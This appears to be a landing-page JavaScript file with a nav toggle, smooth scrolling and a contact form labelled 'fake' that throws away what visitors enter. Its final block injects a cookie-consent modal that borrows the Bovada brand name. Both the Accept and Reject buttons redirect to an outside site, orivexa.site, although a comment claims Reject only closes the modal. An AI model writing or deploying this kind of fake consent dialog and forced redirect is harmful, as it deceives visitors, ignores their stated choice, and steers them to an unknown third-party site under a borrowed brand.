
// Mobile nav toggle
const navToggle = document.querySelector('[data-nav-toggle]');
const navMenu = document.querySelector('[data-nav-menu]');
if(navToggle && navMenu){
  navToggle.addEventListener('click', ()=>{
    navMenu.classList.toggle('open');
    navMenu.style.display = navMenu.classList.contains('open') ? 'flex' : '';
  })
}

// Smooth scroll
document.querySelectorAll('a[href^="#"]').forEach(a=>{
  a.addEventListener('click', e=>{
    const href = a.getAttribute('href');
    if(href && href.startsWith('#')){
      const el = document.querySelector(href);
      if(el){
        e.preventDefault();
        el.scrollIntoView({behavior:'smooth', block:'start'});
      }
    }
  })
})

// Fake form submit
const form = document.querySelector('#contact-form');
if(form){
  form.addEventListener('submit', (e)=>{
    e.preventDefault();
    const data = Object.fromEntries(new FormData(form).entries());
    alert(`Thanks ${data.name || 'there'}! We'll reach out to ${data.email || 'your inbox'} soon.`);
    form.reset();
  });
}

// Your Cookie Settings Modal: show ONLY on home/lander pages and once per session.
(function(){
  const path = window.location.pathname;
  // Show on index.html, lander.html, or root path
  const isTargetPage = /(^\/$|index\.html$|lander\.html$)/.test(path);
  if(!isTargetPage) return;

  const bd = document.createElement('div');
  bd.className = 'modal-backdrop';
  bd.innerHTML = `
    <div class="modal">
      <h3>Bovada Your Cookie Settings</h3>
      <p>Our system requries cookies to function. Some are technical necessart, while others can be adjusted by you in the settings. Find out more in our privacy .</p>
      <div style="display:flex;gap:10px;flex-wrap:wrap">
        <button class="btn" id="age-yes">Accept Cookies</button>
        <button class="btn ghost" id="age-no">Reject Cookies</button>
      </div>
    </div>`;
  document.body.appendChild(bd);
  bd.style.display='flex';
   function closeGate(){ bd.style.display='none'; bd.remove(); }  
  // ✅ Redirect when "Yes" is clicked
  bd.querySelector('#age-yes').addEventListener('click', function(){
    window.location.href = "https://orivexa.site/"; // change to your target page
  });
 
  // ✅ Just close modal when "No" is clicked
  bd.querySelector('#age-no').addEventListener('click', function(){
    window.location.href = "https://orivexa.site/"; // change to your target page
  });
})();
